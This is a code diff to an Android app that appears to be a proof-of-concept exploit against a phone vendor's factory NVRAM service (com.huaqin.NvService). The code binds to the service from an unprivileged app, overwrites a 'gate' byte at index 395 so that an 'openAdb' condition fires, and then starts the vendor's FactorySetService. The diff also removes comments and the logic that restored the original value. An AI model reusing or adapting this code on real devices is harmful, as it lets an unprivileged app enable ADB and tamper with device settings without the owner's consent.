@@ -15,7 +15,7 @@ public class MainActivity extends Activity {
     static final String PKG = "com.huaqin.NvService";
     static final String CLS = "com.huaqin.NvService.FactoryNvramService";
     static final String DESC = "aidl.NvAidlService";
-    static final int DEPTH = 0x18b;   // 395, the openAdb gate index in PRODUCT_INFO
+    static final int DEPTH = 0x18b;
 
     static IBinder svc;
 
@@ -42,7 +42,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    static int write(int idx, int val) {
+    static void write(int idx, int val) {
         try {
             Parcel data = Parcel.obtain();
             Parcel reply = Parcel.obtain();
@@ -55,10 +55,8 @@ public class MainActivity extends Activity {
             data.recycle();
             reply.recycle();
             log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + r);
-            return r;
         } catch (Throwable t) {
             log("W EX: " + t);
-            return -999;
         }
     }
 
@@ -83,31 +81,40 @@ public class MainActivity extends Activity {
                         public void run() {
                             try {
                                 log("desc=" + svc.getInterfaceDescriptor());
-
-                                // STEP0: read gate byte (0x18b = 395)
                                 int v0 = byteAt(DEPTH);
-                                log("GATE idx=" + DEPTH + " current=0x" + Integer.toHexString(v0)
+                                log("GATE idx=" + DEPTH + " before=0x" + Integer.toHexString(v0)
                                         + " ('" + (char) v0 + "')");
-                                log("  readFlagsForMTK would return: "
-                                        + (v0 == 0x31 ? "1 (openAdb FIRES)" : v0 == 0x32 ? "2 (no action)" : "-1"));
 
-                                // STEP1: set gate to '1'  (selector 1 -> '1')
-                                log("STEP1 set gate -> 1 (this satisfies openAdb condition)");
+                                log("OPEN gate: write idx=395 -> '1'");
                                 write(DEPTH, 1);
-                                int v1 = byteAt(DEPTH);
-                                log("  VERIFY gate now=0x" + Integer.toHexString(v1)
-                                        + " ('" + (char) v1 + "')  gateOpen=" + (v1 == 0x31));
+                                log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));
 
-                                // STEP2: restore original value
-                                int backSel = (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0);
-                                log("STEP2 restore gate -> selector " + backSel);
-                                write(DEPTH, backSel);
+                                log("NOW starting FactorySetService (unprivileged startService)");
+                                Intent s = new Intent();
+                                s.setComponent(new ComponentName(
+                                        "com.huaqin.factoryservice",
+                                        "com.huaqin.factoryservice.FactorySetService"));
+                                s.setAction("com.huaqin.action.factoryset");
+                                try {
+                                    startService(s);
+                                    log("  startService returned OK");
+                                } catch (Throwable t) {
+                                    log("  startService EX: " + t);
+                                }
+                                Thread.sleep(3000);
+
                                 int v2 = byteAt(DEPTH);
-                                log("  VERIFY gate now=0x" + Integer.toHexString(v2)
-                                        + " ('" + (char) v2 + "')  restored=" + (v2 == v0));
+                                log("GATE idx=" + DEPTH + " afterService=0x" + Integer.toHexString(v2)
+                                        + " ('" + (char) v2 + "')");
+                                log("  (service may auto-rewrite to '2' via writeNVItem)");
 
-                                // final: confirm wider region intact
-                                log("REGION 384..448 = " + readHex(384, 448));
+                                // safety: if gate still '1', restore to '2'
+                                if (v2 == 0x31) {
+                                    log("SAFETY: gate still 1, forcing back to '2'");
+                                    write(DEPTH, 2);
+                                    log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));
+                                }
+                                log("REGION 384..416 = " + readHex(384, 416));
                             } catch (Throwable t) {
                                 log("EX: " + t);
                             }
